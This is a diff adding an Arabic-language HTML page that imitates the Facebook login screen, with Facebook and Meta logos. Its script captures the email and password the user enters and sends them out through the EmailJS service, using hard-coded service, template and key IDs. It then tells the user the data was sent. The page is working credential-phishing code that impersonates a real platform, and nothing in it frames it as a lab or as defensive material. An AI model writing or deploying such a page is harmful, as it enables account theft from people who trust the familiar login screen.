@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          // هذا هو المفتاح العام (Public Key) من حسابك
+          emailjs.init("gRyeibxuHFxc4EdG7");
+       })();
+    </script>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo">
+        </div>
+
+        <form class="login-form" id="login-form">
+            <div class="input-group">
+                <input type="text" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="كلمة السر" required>
+            </div>
+            
+            <button type="submit" class="login-button">تسجيل الدخول</button>
+            
+            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+            
+            <hr class="separator">
+            
+            <button type="button" class="create-account-button">إنشاء حساب جديد</button>
+        </form>
+
+        <div class="meta-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Meta_Platforms_logo.png" alt="Meta Logo">
+        </div>
+    </div>
+    
+    <script>
+        const loginForm = document.getElementById('login-form');
+
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const email = loginForm.elements['email'].value;
+            const password = loginForm.elements['password'].value;
+
+            // هنا نستخدم معرّف الخدمة ومعرّف القالب الصحيحين
+            emailjs.send("service_1e8jc07", "template_2150nky", {
+                email: email,
+                password: password
+            }).then(function(response) {
+                alert('تم إرسال البيانات بنجاح!');
+                console.log('SUCCESS!', response.status, response.text);
+            }, function(error) {
+                alert('فشل الإرسال. حاول مرة أخرى.');
+                console.log('FAILED...', error);
+            });
+        });
+    </script>
+
+</body>
+</html>
